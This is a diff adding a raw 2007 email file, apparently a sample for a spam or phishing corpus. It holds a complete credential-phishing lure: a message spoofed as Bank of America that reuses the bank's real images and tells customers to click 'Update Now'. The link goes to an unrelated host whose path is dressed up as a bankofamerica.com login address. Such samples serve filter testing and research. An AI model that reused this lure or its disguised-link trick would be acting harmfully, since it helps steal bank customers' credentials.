@@ -1,0 +1,79 @@
+From nobody Sun Jan 25 13:50:03 2015
+Return-Path: <root@vpstrial01.readyspace.com.hk>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+ by example.com (Postfix) with ESMTP id 3B2E7468DC
+ for <user@login.example.com>; Wed, 16 May 2007 18:26:16 -0400 (EDT)
+Received: from mail.example.org (mail.example.org [192.168.6.4])
+ by mail.example.org (Postfix) with ESMTP id 381E4131FB2C
+ for <user@example.com>; Wed, 16 May 2007 18:26:16 -0400 (EDT)
+Received: from vpstrial01.readyspace.com.hk (unknown [202.79.208.52])
+ by mail.example.org (Postfix) with ESMTP id C1FDF6FA1C5
+ for <user@example.com>; Wed, 16 May 2007 18:26:15 -0400 (EDT)
+Received: from vpstrial01.readyspace.com.hk (vpstrial01.readyspace.com.hk
+ [127.0.0.1])
+ by vpstrial01.readyspace.com.hk (8.13.8/8.13.8) with ESMTP id l4GMO3Q1015867
+ for <user@example.com>; Thu, 17 May 2007 06:24:03 +0800
+Received: (from root@localhost)
+ by vpstrial01.readyspace.com.hk (8.13.8/8.13.8/Submit) id l4GMO2fw015860;
+ Thu, 17 May 2007 06:24:02 +0800
+Date: Thu, 17 May 2007 06:24:02 +0800
+Message-Id: <200705162224.l4GMO2fw015860@vpstrial01.readyspace.com.hk>
+To: user@example.com
+Subject: Online Banking Profile Update Required
+From: Bank Of America <onlinebanking@email-bankofamerica.com>
+Content-Type: text/html
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 1267
+
+
+<html>
+
+<head>
+<meta http-equiv="Content-Language" content="en-us">
+<meta name="GENERATOR" content="Microsoft FrontPage 5.0">
+<meta name="ProgId" content="FrontPage.Editor.Document">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title>New Page 1</title>
+</head>
+
+<body>
+
+<p>
+<img alt="Bank of America Higher Standards" src="http://alert.bankofamerica.com/images/client/bankofamerica/email_masthead_top.jpg" width="747" height="70"></p>
+<p>
+<img alt="Customer using a laptop for Online Banking" src="http://alert.bankofamerica.com/images/client/bankofamerica/em_photo.jpg" width="160" height="103"><img alt="Online Banking Alert" src="http://alert.bankofamerica.com/images/client/bankofamerica/em_title_red.gif" width="193" height="103"></p>
+<p> </p>
+<h1>Online Banking Profile Update Required.</h1>
+<hr SIZE="1">
+<p><font size="4"></font> Dear Valued Customer :</p>
+<p>
+We recently performed a system maintenance on our Secure-Server for Online
+Banking users, this is to ensure that our Valued customers such as you access
+your accounts easily and without hassles . This Upgrade was designed in order to
+provide a better and risk-free Online Banking session, during an attempt to
+upgrade your account into our newly-secured secured-server we were unable to
+update your account therefore leading us to send you this e-mail letter which
+was sent directly from our Secured Updating Server. You are required to click on
+the " Update Now " link stated below in order to update your account ,
+clicking on the " Update Now " will take you to our external secured server (
+Fully Secured ) where you will be required to fill in necessary information in
+order to complete your update process . Click on the " Update Now " link below :</p>
+<p><font size="4"></font><a href="http://mail.ilshin.com/src/onlineid/cgi-bin/onlineid.bankofamerica/sso.login.controller/.www.bankofamerica.com/"><font size="4">Update
+Now</font></a></p>
+<p> Thank you for your understanding and correspondence,
+we also apologize for any inconveniences caused .</p>
+<p></p>
+<p><font size="4">Online Banking Accounts Department -</font></p>
+<p><b><font size="4"> </font></b><font size="4">Bank Of
+America</font><b><font size="4"> .</font></b></p>
+<p>Bank of America, Member FDIC.
+<img alt="Official Sponsor 2004-2008 U.S. Olympic Teams" src="http://alert.bankofamerica.com/images/client/bankofamerica/OlympicLogo_2_6_8_1_1_image.gif" align="right" width="131" height="33"><br>
+© 2007 Bank of America Corporation. All Rights Reserved.</p>
+
+</body>
+
+</html>
